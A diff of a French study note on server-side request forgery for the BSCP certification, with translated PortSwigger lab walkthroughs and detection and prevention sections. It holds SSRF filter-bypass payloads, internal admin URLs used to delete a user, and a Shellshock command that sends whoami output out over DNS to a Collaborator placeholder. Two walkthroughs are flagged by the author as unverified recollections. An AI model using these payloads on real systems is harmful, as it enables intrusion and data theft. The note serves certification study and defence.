@@ -1,148 +1,66 @@
 ---
 tags: [bscp, server-side, ssrf]
 niveau: practitioner
-statut: à faire
+statut: en cours
 ---
 # Server-side request forgery (SSRF)
 
 ## En bref
-- SSRF est une faille qui permet à un attaquant d'amener une application côté serveur et à envoyer des requêtes vers une destination non prévue.
-- Le serveur est amené à se connecter à des services à usage interne, au sein de l'infrastructure.
-- Le serveur peut être forcé à se connecter à des systèmes externes.
-- L'impact est qu'une fuite de données sensible est possible.
+- La SSRF est une faille qui permet à un attaquant d'amener une application côté serveur à envoyer des requêtes vers une destination non prévue.
+- Le serveur peut être amené à se connecter à des services à usage interne, au sein de l'infrastructure.
+- Il peut aussi être forcé à se connecter à des systèmes externes.
+- L'impact est qu'une fuite de données sensibles est possible.
 ![](SSRF.png)
+
 ## Impact
-- Une attaque SSRF réussie peut entraîner des actions non autorisée aux données au sein d'une organisation.
-- Cela peut se produire dans l'application elle même, ou sur d'autres système back-end avec lesquels elle communique.
+- Une attaque SSRF réussie peut entraîner des actions non autorisées ou un accès non autorisé aux données au sein d'une organisation.
+- Cela peut se produire dans l'application elle-même, ou sur d'autres systèmes back-end avec lesquels elle communique.
 - Dans certains cas, la SSRF peut permettre à un attaquant d'exécuter des commandes arbitraires.
 - Ces attaques peuvent sembler provenir de l'organisation qui héberge l'application vulnérable (l'adresse IP source est celle du serveur).
 
-
 ## Types et variantes
-### Attaque SSRF courantes
-- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable.
-- Elles permettent d'effectuer des actions non autorisées.
-- Les relations de confiance sont exploitées : 
-	- A travers le serveur lui-même
-	- Celles qui concernent d'autres systèmes back-end au sein de la même organisation.
-- Il est fréquent de rencontrer des applications présentant un comportement SSRF et intégrant des mesures de protection destinées à empêcher toute exploitation malveillante. Souvent, ces mesures de protection peuvent être contournées.
-### SSRF avec des filtres d'entrée basés sur une liste noire
-- Certaines applications bloquent les noms d'hôtes comme `127.0.0.1` et `localhost`, ou des URL sensibles comme `/admin`.
-- Le filtre peut être contourné avec les techniques suivantes:
-	- Utiliser une autre représentation IP de `127.0.0.1` : `2130706433`, `017700000001` ou `127.1`.
-	- Enregistrer son propre nom de domaine qui pointe vers `127.0.0.1` (par exemple `spoofed.burpcollaborator.net`).
-	- Masquer les chaînes bloquées par encodage d'URL ou en variant la casse.
-	- Fournir une URL contrôlée par l'attaquant qui redirige vers l'URL cible, en essayant différents codes de redirection et différents protocoles. Passer d'une URL `http:` à `https:` lors de la redirection a permis de contourner certains filtres anti-SSRF.
-### SSRF avec filtres d'entrée basés sur une liste blanche
-- Certaines applications n'autorisent que les entrées correspondant à une liste blanche de valeurs.
-- Le filtre peut chercher une correspondance au début de l'entrée ou à l'intérieur.
-- Il peut être contourné en exploitant des incohérences dans l'analyse des URL, car les fonctionnalités de la spécification sont souvent négligées quand l'analyse et la validation sont faites de façon ad hoc.
-- Ce filtre peut être contourner de la manière suivante:
-	- Identifiants avant le nom d'hôte, avec le caractère `@` : `https://expected-host:fakepassword@evil-host`
-	- Fragment d'URL, avec le caractère `#` : `https://evil-host#expected-host`
-	- Hiérarchie DNS : placer la valeur attendue dans un nom DNS complet que l'on contrôle : `https://expected-host.evil-host`
-	- Encodage d'URL pour semer la confusion dans l'analyse. Utile surtout si le code du filtre traîne les caractères encodés différemment du code qui effectue la requête HTTP.
-	- Double encodage : certains serveurs décodent de manière récursive, ce qui peut créer d'autres divergences.
-### Contournement des filtres SSRF via une vulnérabilités de redirection ouverte
-- Condition: l'application dont les URL sont autorisées contient une redirection ouverte et l'API qui effectue la requête HTTP côté serveur prend en charge les redirections.
-- L'attaquant construit alors une URL qui satisfait le filtre mais aboutit à une requête redirigée vers la cible interne voulue.
-- Exemple:
-	- L'URL `/product/nextProduct?currentProductId=6&path=http://evil-user.net` renvoie une redirection vers `http://evil-user.net`.
-- Exploitation:
-	- L'attaquant envoie `stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin`.
-- Pourquoi ça marche?
-	- L'application vérifie d'abord que l'URL `stockApi` est sur un domaine autorisé, ce qui est le cas.
-	- Elle interroge ensuite cette URL, ce qui déclenche la redirection ouverte.
-	- Elle suit la redirection et envoie une requête vers l'URL interne choisie par l'attaquant.
+- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable : la confiance envers le serveur lui-même, ou envers d'autres systèmes back-end de la même organisation.
+- Il est fréquent de rencontrer des applications vulnérables qui intègrent des mesures de protection contre l'exploitation. Ces mesures peuvent souvent être contournées.
 
-### SSRF Blind Vulnérabilités
-- Elle survient quand on peut forcer l'application à envoyer une requête HTTP vers une URL fournie, mais que la réponse n'apparaît pas dans ce que renvoie l'interface de l'application.
-- Plus difficile à exploiter qu'une SSRF classique.
-- Peut parfois conduire à l'exécution complète de code à distance sur le serveur ou sur d'autres composants du back-end.
-- Impact:
-	- Leur impact est souvent moindre que celui des SSRF « pleinement informées », à cause de leur nature unidirectionnelle.
-- Limite:
-	- Elles ne peuvent pas être exploitées facilement pour extraire des données sensibles des systèmes back-end.
-- Comment les détecter?
-	- La méthode la plus fiable repose sur les techniques hors bande (OAST).
-	- Principe : tenter de déclencher une requête HTTP vers un système externe que l'on contrôle, puis surveiller les interactions réseau avec ce système.
-- Burp Collaborator
-	- C'est l'outil le plus simple et le plus efficace pour l'OAST.
-	- Il génère des noms de domaine uniques, à envoyer comme charges utiles à l'application, puis surveille toute interaction avec ces domaines.
-	- Une requête HTTP entrante provenant de l'application indique qu'elle est vulnérable au SSRF.
-- Remarque: requête DNS sans requête HTTP:
-	- Il est fréquent d'observer une requête DNS pour le domaine Collaborator sans requête HTTP ensuite.
-	- Cause habituelle : l'application a tenté la requête HTTP, ce qui a déclenché la requête DNS, mais un filtrage réseau a bloqué la requête HTTP elle-même.
-	- L'infrastructure autorise couramment le trafic DNS sortant, nécessaire à de nombreux usages, mais bloque les connexions HTTP vers des destinations inattendues.
-- Exploitation des SSRF Aveugles:
-	- Détecter une SSRF aveugle capable de déclencher des requêtes HTTP hors bande ne suffit pas à garantir qu'elle est exploitable.
-	- La réponse de la requête back-end étant invisible, ce comportement ne permet pas d'explorer le contenu des systèmes accessibles au serveur d'applications.
-	- Méthode 1 : Rechercher d'autres vulnérabilités
-		- La SSRF peut servir à chercher des vulnérabilités sur le serveur lui-même ou sur d'autres systèmes back-end.
-		- Il est possible de balayer à l'aveugle l'espace d'adresses IP interne avec des charges utiles conçues pour détecter des vulnérabilités bien connues.
-		- Si ces charges utiles emploient aussi des techniques hors bande, on peut découvrir une vulnérabilité critique sur un serveur interne non patché.
-	- Méthode 2 : Réponses malveillantes:
-		- Amener l'application à se connecter à un système contrôlé par l'attaquant, qui renvoie des réponses malveillantes au client HTTP à l'origine de la connexion.
-		- Si une grave vulnérabilité côté client existe dans l'implémentation HTTP du serveur, elle peut permettre une exécution de code à distance au sein de l'infrastructure de l'application.
-### Identification des surfaces d'attaque cachées pour les SSRF
-- De nombreuses SSRF sont facile à détecter: le trafic normal de l'application contient des paramètres de requête avec des URL complètes.
-### URL Partielles
-- Une application peut n'intégrer dans les paramètres de requête qu'un nom d'hôte ou une partie d'un chemin d'URL.
-- Côté serveur, cette valeur est insérée dans une URL complète qui fait ensuite l'objet de la requête.
-- Surface d'attaque:
-	- Si la valeur est facilement identifiable comme un nom d'hôte ou un chemin d'URL, la surface d'attaque peut être évidente.
-## URL Dans les formats de données
-- Certaines applications transmettent des données dans des formats dont la spécification autorise l'inclusion d'URL, que l'analyseur du format peut ensuite solliciter.
-- Exemple XML:
-	- Format largement utilisé dans les applications web pour transmettre des données structurées du client au serveur.
-	- Une application qui accepte et analyse du XML peut être vulnérable à une injection XXE.
-	- Elle peut aussi être vulnérable à une SSRF via XXE.
-### SSRF via l'en-tête Referer
-- Certaines applications utilisent des logiciels d'analyse côté serveur pour suivre les visiteurs.
-- Ces logiciels enregistrent souvent l'en-tête Referer des requêtes, afin de suivre les liens entrants.
-- Surface d'attaque:
-	- Ils accèdent fréquemment aux URL tierces présentes dans l'en-tête Referer.
-	- Le but est généralement d'analyser le contenu des sites référents, y compris le texte d'ancrage des liens entrants.
-	- L'en-tête Referer est donc souvent une surface d'attaque utile pour les SSRF (et, d'après ce qui précède, plutôt de type aveugle, à tester avec Burp Collaborator).
+| Type | Idée clé | Note | Niveau |
+| --- | --- | --- | --- |
+| Contre le serveur local | `stockApi=http://localhost/admin` | [[SSRF-serveur-local]] | Apprentice |
+| Contre d'autres systèmes back-end | Adresses privées, balayage Intruder | [[SSRF-systemes-back-end]] | Apprentice |
+| Filtre par liste noire | `127.1`, double encodage | [[SSRF-filtre-liste-noire]] | Practitioner |
+| Filtre par liste blanche | `@`, `#`, DNS, encodage | [[SSRF-filtre-liste-blanche]] | Expert |
+| Redirection ouverte | Domaine autorisé qui redirige | [[SSRF-redirection-ouverte]] | Practitioner |
+| SSRF aveugle | Détection hors bande (OAST) | [[SSRF-aveugle]] | Practitioner, Expert |
+| Surfaces cachées | URL partielles, XML, `Referer` | [[SSRF-surfaces-cachees]] | Practitioner |
+
 ## Comment détecter
-- 
+- Repérer tout paramètre, corps ou en-tête qui contient une URL, un nom d'hôte ou un chemin (`url`, `stockApi`, `path`, `redirect`, `webhook`, `callback`, `Referer`).
+- Remplacer la valeur par `http://localhost/` ou par une adresse Burp Collaborator, puis comparer la réponse et surveiller les interactions.
+- Si la réponse n'affiche rien mais que Collaborator reçoit une interaction : SSRF aveugle (voir [[SSRF-aveugle]]).
+- Si seule une requête DNS arrive : la requête HTTP est probablement filtrée en sortie.
+- Penser aux surfaces moins évidentes : voir [[SSRF-surfaces-cachees]].
 
 ## Comment exploiter (principe)
-- **Attaque contre le serveur lui-même**
-	- L'attaquant amène l'application à envoyer une requête HTTP vers le serveur qui l'héberge via son interface réseau de bouclage.
-	- L'URL fournie contient généralement `127.0.0.1` ou `localhost`
-- **Exemple: Vérification de stock dans une boutique en ligne**
-	- Pour afficher ses stocks, l'application interroge des API REST.
-	- Le navigateur envoie une requête `POST /product/stock` dont le paramètre `stockApi` contient l'URL du point de terminaison.
-	- Le serveur envoie la requête à cette URL et récupère l'état des stocks et les renvoie à l'utilisateur.
-- **L'attaque**
-	- L'attaquant modifie le paramètre pour y mettre une URL locale au serveur: `stockApi=http://localhost/admin`
-	- Ainsi Le serveur récupère le contenu de `/admin` et le renvoie à l'attaquant.
-- **Pourquoi cela marche ?**
-	- Normalement, `/admin` est accessible uniquement aux utilisateur qui se sont authentifiés.
-	- Quand la requête provient de la machine locale, les contrôles d'accès habituels sont contournés.
-- **Pourquoi les applications font confiance à la machine locale**
-	- Le contrôle d'accès peut être implémenté dans un composant distinct, situé en amont du serveur d'applications. Une connexion établie directement depuis le serveur contourne ce contrôle.
-	- l'application peut autoriser un accès administratif sans authentification à tout utilisateur provenant de la machine locale. Un administrateur peut ainsi restaurer le système s'il perd ses identifiants
-	- L'interface d'administration peut écouter sur un autre port que l'application principale et n'être pas accessible directement aux utilisateurs.
-	- Ces relations de confiance, où les requêtes locales sont traités different des requêtes ordinaires, font souvent de la SSRF une faille cririque.
-	
-- **SSRF contre d'autres systèmes back-end**:
-	- Le serveur d'application peut interagir avec des systèmes back-end qui ne sont pas directement accessibles aux utilisateurs.
-	- Ces système ont souvent des adresses IP privées non routables.
-- **Pourquoi est-ce vulnérable?**
-	- Ils sont généralement protégés par la topologie du réseau, d'où un niveau de sécurité souvent plus faible.
-	- Beaucoup contiennent des fonctionnalités sensibles accessibles sans authentification à quiconque peut interagir avec eux.
-- **Exemple**
-	- Une interface d'administration existe à l'URL back-end `http://192.168.0.68/admin`.
-	- L'attaquant envoie une requête `POST /product/stock` avec `stockApi=http://192.168.0.68/admin`.
-	- Le serveur d'applications relaie la requête vers ce système interne, ce qui donne accès à l'interface d'administration.
+1. Identifier le paramètre qui déclenche la requête côté serveur.
+2. Vérifier si la réponse est visible (SSRF classique) ou non (SSRF aveugle).
+3. Viser en priorité le serveur lui-même (`localhost`) puis les plages privées (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`).
+4. Si un filtre bloque la requête, identifier sa nature (liste noire ou liste blanche) et appliquer la technique de contournement correspondante.
+5. Lire le HTML de l'interface trouvée pour repérer l'action à déclencher, puis la rejouer via la SSRF.
+
+Détails dans [[SSRF-serveur-local]] et [[SSRF-systemes-back-end]].
 
 ## Pièges et points d'attention BSCP
-- 
+- Un filtre peut empiler plusieurs défenses : contourner l'hôte, puis le chemin, séparément.
+- Si une URL externe est refusée mais que le domaine local passe, penser à la redirection ouverte.
+- Dans les labs, les interactions avec des systèmes externes arbitraires sont bloquées : utiliser le serveur public par défaut de Burp Collaborator.
+- Hors énoncé de la formation (à garder en tête sur cible réelle) : points de métadonnées cloud (`http://169.254.169.254/`), schémas autres que HTTP (`file://`, `gopher://`, `dict://`), rebinding DNS.
 
 ## Prévention
-- 
+- Préférer une liste blanche stricte de destinations (hôtes, ports, chemins) plutôt qu'une liste noire.
+- Valider le schéma (HTTP et HTTPS uniquement) et résoudre le nom d'hôte côté serveur avant la requête, puis vérifier que l'adresse résolue n'est pas privée ni de bouclage.
+- Désactiver le suivi des redirections ou revalider chaque redirection.
+- Ne jamais renvoyer au client la réponse brute de la requête côté serveur.
+- Segmenter le réseau et authentifier les services internes : ne pas se reposer sur la seule topologie ou sur la provenance locale d'une requête.
+- Bloquer les connexions sortantes inutiles depuis le serveur d'applications.
 
 ## Labs PortSwigger
 - [ ] Apprentice
@@ -150,63 +68,123 @@ statut: à faire
 - [ ] Expert
 
 ## Journal des labs
-### Lab: Basic SSRF against the local server
-This lab has a stock check feature which fetches data from an internal system.
-To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
 
-1. Browse to `/admin` and observe that you can't directly access the admin page.
-2. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
-3. Change the URL in the `stockApi` parameter to `http://localhost/admin`. This should display the administration interface.
-4. Read the HTML to identify the URL to delete the target user, which is:
-    
-    `http://localhost/admin/delete?username=carlos`
-5. Submit this URL in the `stockApi` parameter, to deliver the SSRF attack.
-### Lab: Basic SSRF against another back-end system
-This lab has a stock check feature which fetches data from an internal system.
-To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.
+### Lab 1 - SSRF basique contre le serveur local
+*Basic SSRF against the local server* - Apprentice - note : [[SSRF-serveur-local]]
 
-1. Visit a product, click **Check stock**, intercept the request in Burp Suite, and send it to Burp Intruder.
-2. Change the `stockApi` parameter to `http://192.168.0.1:8080/admin` then highlight the final octet of the IP address (the number `1`) and click **Add §**.
-3. In the **Payloads** side panel, change the payload type to **Numbers**, and enter 1, 255, and 1 in the **From** and **To** and **Step** boxes respectively.
-4. Click  **Start attack**.
-5. Click on the **Status** column to sort it by status code ascending. You should see a single entry with a status of `200`, showing an admin interface.
-6. Click on this request, send it to Burp Repeater, and change the path in the `stockApi` to: `/admin/delete?username=carlos`
-### Lab: SSRF with blacklist-based input filter
-This lab has a stock check feature which fetches data from an internal system.
-To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
-The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
+Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
+Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.
 
-1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
-2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the request is blocked.
-3. Bypass the block by changing the URL to: `http://127.1/`
-4. Change the URL to `http://127.1/admin` and observe that the URL is blocked again.
-5. Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
-### Lab: SSRF with filter bypass via open redirection vulnerability
-This lab has a stock check feature which fetches data from an internal system.
-To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.
-The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
+1. Accédez à `/admin` et constatez que vous ne pouvez pas accéder directement à la page d'administration.
+2. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
+3. Remplacez l'URL du paramètre `stockApi` par `http://localhost/admin`. L'interface d'administration doit s'afficher.
+4. Lisez le HTML pour identifier l'URL de suppression de l'utilisateur cible :
 
-1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
-2. Try tampering with the `stockApi` parameter and observe that it isn't possible to make the server issue the request directly to a different host.
-3. Click "next product" and observe that the `path` parameter is placed into the Location header of a redirection response, resulting in an open redirection.
-4. Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the `stockApi` parameter on the stock checker:
-    `/product/nextProduct?path=http://192.168.0.12:8080/admin`
-5. Observe that the stock checker follows the redirection and shows you the admin page.
-6. Amend the path to delete the target user:
-    `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
-### Lab: Blind SSRF with out-of-band detection
-This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
-To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.
-#### Note
-To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+   `http://localhost/admin/delete?username=carlos`
+5. Soumettez cette URL dans le paramètre `stockApi` pour mener l'attaque SSRF.
 
-1. Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
-2. Go to the Repeater tab. Select the Referer header, right-click and select "Insert Collaborator Payload" to replace the original domain with a Burp Collaborator generated domain. Send the request.
-3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
-4. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+### Lab 2 - SSRF basique contre un autre système back-end
+*Basic SSRF against another back-end system* - Apprentice - note : [[SSRF-systemes-back-end]]
 
+Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
+Pour le résoudre, utilisez la vérification de stock afin de balayer la plage interne `192.168.0.X` à la recherche d'une interface d'administration sur le port `8080`, puis utilisez-la pour supprimer l'utilisateur `carlos`.
+
+1. Ouvrez une page produit, cliquez sur **Check stock**, interceptez la requête dans Burp Suite et envoyez-la dans Burp Intruder.
+2. Remplacez le paramètre `stockApi` par `http://192.168.0.1:8080/admin`, puis sélectionnez le dernier octet de l'adresse IP (le nombre `1`) et cliquez sur **Add §**.
+3. Dans le panneau **Payloads**, choisissez le type de payload **Numbers**, puis saisissez 1, 255 et 1 dans les champs **From**, **To** et **Step**.
+4. Cliquez sur **Start attack**.
+5. Cliquez sur la colonne **Status** pour trier par code de statut croissant. Une seule entrée doit avoir le statut `200` et afficher une interface d'administration.
+6. Cliquez sur cette requête, envoyez-la dans Burp Repeater et remplacez le chemin dans `stockApi` par : `/admin/delete?username=carlos`
+
+### Lab 3 - SSRF avec filtre d'entrée basé sur une liste noire
+*SSRF with blacklist-based input filter* - Practitioner - note : [[SSRF-filtre-liste-noire]]
+
+Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
+Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`.
+Le développeur a mis en place deux défenses anti-SSRF faibles que vous devrez contourner.
+
+1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
+2. Remplacez l'URL du paramètre `stockApi` par `http://127.0.0.1/` et constatez que la requête est bloquée.
+3. Contournez le blocage avec l'URL `http://127.1/`.
+4. Remplacez l'URL par `http://127.1/admin` et constatez que la requête est de nouveau bloquée.
+5. Masquez le « a » en le double-encodant en `%2561` pour accéder à l'interface d'administration, puis supprimez l'utilisateur cible.
+
+### Lab 4 - SSRF avec contournement du filtre via une redirection ouverte
+*SSRF with filter bypass via open redirection vulnerability* - Practitioner - note : [[SSRF-redirection-ouverte]]
+
+Ce lab propose une fonction de vérification de stock qui récupère des données depuis un système interne.
+Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://192.168.0.12:8080/admin`, puis supprimez l'utilisateur `carlos`.
+Le vérificateur de stock est restreint à l'application locale : vous devez donc d'abord trouver une redirection ouverte qui affecte l'application.
+
+1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
+2. Essayez de modifier le paramètre `stockApi` et constatez qu'il est impossible de faire envoyer la requête directement vers un autre hôte.
+3. Cliquez sur « next product » et constatez que le paramètre `path` est placé dans l'en-tête `Location` d'une réponse de redirection, ce qui constitue une redirection ouverte.
+4. Construisez une URL qui exploite la redirection ouverte et redirige vers l'interface d'administration, puis placez-la dans le paramètre `stockApi` du vérificateur de stock :
+
+   `/product/nextProduct?path=http://192.168.0.12:8080/admin`
+5. Constatez que le vérificateur de stock suit la redirection et affiche la page d'administration.
+6. Modifiez le paramètre `path` pour supprimer l'utilisateur cible :
+
+   `/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+
+### Lab 5 - SSRF aveugle avec détection hors bande
+*Blind SSRF with out-of-band detection* - Practitioner - notes : [[SSRF-aveugle]], [[SSRF-surfaces-cachees]]
+
+Ce site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer` lors du chargement d'une page produit.
+Pour résoudre le lab, utilisez cette fonctionnalité pour provoquer une requête HTTP vers le serveur public de Burp Collaborator.
+
+> [!note] Remarque
+> Pour éviter que la plateforme Academy soit utilisée pour attaquer des tiers, notre pare-feu bloque les interactions entre les labs et des systèmes externes arbitraires. Pour résoudre le lab, vous devez utiliser le serveur public par défaut de Burp Collaborator.
+
+1. Ouvrez une page produit, interceptez la requête dans Burp Suite et envoyez-la dans Burp Repeater.
+2. Allez dans l'onglet Repeater. Sélectionnez l'en-tête `Referer`, faites un clic droit et choisissez « Insert Collaborator Payload » pour remplacer le domaine d'origine par un domaine généré par Burp Collaborator. Envoyez la requête.
+3. Allez dans l'onglet Collaborator et cliquez sur « Poll now ». Si aucune interaction n'apparaît, patientez quelques secondes et réessayez : la commande côté serveur est exécutée de façon asynchrone.
+4. Vous devriez voir des interactions DNS et HTTP initiées par l'application à la suite de votre payload.
+
+### Lab 6 - SSRF avec filtre d'entrée basé sur une liste blanche
+*SSRF with whitelist-based input filter* - Expert - note : [[SSRF-filtre-liste-blanche]]
+
+> [!warning] Étapes rédigées de mémoire
+> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab.
+
+Pour le résoudre, modifiez l'URL de vérification de stock afin d'accéder à l'interface d'administration à l'adresse `http://localhost/admin`, puis supprimez l'utilisateur `carlos`. Le développeur a mis en place une défense anti-SSRF qu'il faut contourner.
+
+1. Ouvrez une page produit, cliquez sur « Check stock », interceptez la requête et envoyez-la dans Burp Repeater.
+2. Remplacez `stockApi` par `http://localhost/` et constatez que la requête est refusée : l'hôte doit être `stock.weliketoshop.net`.
+3. Testez `http://username@stock.weliketoshop.net/` : la requête est acceptée, ce qui montre que l'analyseur accepte les identifiants avant le nom d'hôte.
+4. Ajoutez un fragment : `http://localhost#@stock.weliketoshop.net/` est refusé car `#` est bloqué.
+5. Double-encodez `#` en `%2523` : `http://localhost%2523@stock.weliketoshop.net/` est accepté.
+6. Ajoutez le chemin d'administration : `http://localhost:80%2523@stock.weliketoshop.net/admin`.
+7. Lisez le HTML pour trouver l'URL de suppression, puis envoyez `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`.
+
+### Lab 7 - SSRF aveugle avec exploitation de Shellshock
+*Blind SSRF with Shellshock exploitation* - Expert - note : [[SSRF-aveugle]]
+
+> [!warning] Étapes rédigées de mémoire
+> Cette section n'était pas dans la page d'origine. Les étapes ci-dessous sont reconstituées de mémoire à partir de la solution publique du lab et n'ont pas été rejouées : à vérifier sur le lab. Le lab nécessite Burp Suite Professional (Collaborator).
+
+Le site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-tête `Referer`. Un serveur interne de la plage `192.168.0.X` sur le port `8080` est vulnérable à Shellshock. Pour résoudre le lab, utilisez la SSRF pour exécuter une commande sur ce serveur et exfiltrer le nom de l'utilisateur du système d'exploitation via une requête DNS vers Burp Collaborator.
+
+1. Ouvrez une page produit, interceptez la requête et envoyez-la dans Burp Intruder.
+2. Dans l'en-tête `User-Agent`, placez la charge Shellshock, avec un sous-domaine Collaborator : `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
+3. Remplacez l'en-tête `Referer` par `http://192.168.0.1:8080` et placez une position de payload sur le dernier octet.
+4. Choisissez le type de payload **Numbers**, de 1 à 255, par pas de 1, puis lancez l'attaque.
+5. Dans l'onglet Collaborator, cliquez sur « Poll now » : une interaction DNS contient le nom de l'utilisateur en sous-domaine.
+6. Soumettez ce nom d'utilisateur pour valider le lab.
+
+## Mes notes
+- 
 
 ## Liens
+- [[SSRF-serveur-local]]
+- [[SSRF-systemes-back-end]]
+- [[SSRF-filtre-liste-noire]]
+- [[SSRF-filtre-liste-blanche]]
+- [[SSRF-redirection-ouverte]]
+- [[SSRF-aveugle]]
+- [[SSRF-surfaces-cachees]]
 - [[Command-injection]]
 - [[XXE-injection]]
+- [[HTTP-Host-header]]
+- [[Access-control]]
 - [[Web-cache-poisoning]]
